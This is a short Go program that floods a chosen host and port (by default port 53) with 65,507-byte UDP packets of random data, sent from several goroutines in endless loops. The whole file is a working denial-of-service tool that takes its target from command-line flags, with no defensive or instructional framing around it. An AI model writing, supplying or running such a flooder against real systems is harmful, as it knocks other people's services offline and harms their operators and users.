package main

import (
    "flag"
    "fmt"
    "net"
    "log"
    "math/rand"
)

var (
    fhost = flag.String("h", "localhost", "Target host")
    fport = flag.Int("p", 53, "Target port")
    fthreads = flag.Int("t", 1, "Number of threads")
)

func main() {
    flag.Parse()

    addr := fmt.Sprintf("%s:%v", *fhost, *fport)
    buffer := make([]byte, 65507) // UDP max data size

    // Some random data
    _, err := rand.Read(buffer)
    if err != nil {
        log.Fatal(err)
    }

    // The magic goes here
    conn, err := net.Dial("udp", addr)
    if err != nil {
        log.Fatal(err)
    }

    log.Printf("[*] Start flooding %s\n", addr)
    for i := 0; i < *fthreads; i++ {
        go func() {
            for {
                conn.Write(buffer)
            }
        }()
    }

    // Forever
    <-make(chan bool, 1)
}
